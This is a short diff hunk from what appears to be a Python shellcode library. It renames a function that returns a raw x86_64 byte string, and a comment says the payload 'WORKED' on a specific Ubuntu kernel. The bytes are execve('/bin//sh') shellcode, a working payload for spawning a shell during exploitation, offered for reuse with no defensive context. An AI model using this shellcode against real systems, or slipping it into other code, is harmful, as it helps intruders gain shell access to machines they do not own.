@@ -7,7 +7,7 @@
 
 #WORKED
 #Linux whoami 3.19.0-37-generic #42~14.04.1-Ubuntu SMP Mon Nov 23 15:13:51 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
-def bin_sh():
+def bin_shx64():
 	return r"\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
 """
 global _start
